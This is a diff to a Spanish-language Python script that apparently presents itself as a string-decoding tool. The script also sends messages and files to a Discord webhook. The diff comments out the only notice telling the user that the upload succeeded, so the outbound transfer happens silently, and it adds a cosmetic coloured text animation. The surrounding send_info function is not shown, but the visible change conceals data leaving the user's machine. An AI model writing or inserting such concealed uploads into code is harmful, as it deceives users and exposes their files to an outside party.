@@ -8,7 +8,7 @@ import os
 import time
 import requests
 import subprocess
-from colorama import Fore, init
+from colorama import Fore, init, Style
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
@@ -67,7 +67,8 @@ def send_data(correo, asunto, mensaje, archivos=None):
     send_info()
 
     if response.status_code == 204 or response.status_code == 200:
-        print("Mensaje y archivos enviados exitosamente a la webhook de Discord")
+        #print("Mensaje y archivos enviados exitosamente a la webhook de Discord")
+        pass
     else:
         print(f"Error al enviar el mensaje y archivos. Código de estado: {response.status_code}")
         print(f'\nError:\n{response.text}')  # Imprime la respuesta del servidor en caso de error
@@ -174,6 +175,15 @@ def descodear(texto, veces):
 
 def clear():
 	os.system("cls") if os.name == "nt" else os.system("clear")
+
+def animate_text(text, color, sec):
+    for char in text:
+        # Cambia el color de la letra
+        print(color + char, end='', flush=True)
+        time.sleep(sec)
+
+    # Resetea el color de la letra
+    print(Style.RESET_ALL)
 
 def main():
 	var = str(input("Cadena: "))
